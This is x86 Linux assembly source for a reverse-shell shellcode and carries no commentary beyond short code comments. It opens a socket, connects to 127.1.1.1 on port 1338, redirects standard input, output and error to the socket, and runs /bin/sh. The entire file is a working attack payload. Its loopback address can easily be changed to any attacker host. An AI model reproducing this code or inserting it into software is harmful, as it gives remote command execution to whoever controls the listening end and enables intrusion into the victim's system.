
section .text 

global main


main:

    xor eax,eax
    xor esi,esi
    xor edi,edi

    ;int sockfd = socket(domain, type, protocol)

    mov al,102
    mov bl,1

    push esi
    push 1
    push 2 
    mov ecx,esp 

    int 0x80
    mov edi,eax 

    ;   int connect(int sockfd, const struct sockaddr *addr,  
                    ;         socklen_t addrlen);

    ;socket address structure -> AF_INET,PORT,IPADDRESS

    push esi 
    ;127.1.1.1 port 1338
    push 0x0101017f
    push word 0x3a05
    push word 2 
    mov ecx,esp 

    push 16
    push ecx
    push edi 
    mov ecx, esp 

    mov al,102
    mov bl,3
    int 0x80

  ;  mov edi ,eax 


    ;dup2(sockfd,stdio)

    xor eax,eax 
    xor ecx,ecx 

    mov al,63
    mov ebx,edi 
    int 0x80

    mov al,63
    inc ecx 
    int 0x80


    mov al,63
    inc ecx
    int 0x80



    ;execve("//bin/sh",0,0)

    xor eax,eax 
    push esi
    push 0x68732f6e
    push 0x69622f2f ;//bin/sh
    mov ebx,esp 
    xor ecx,ecx
    xor edx,edx 

    mov al,11
    int 0x80















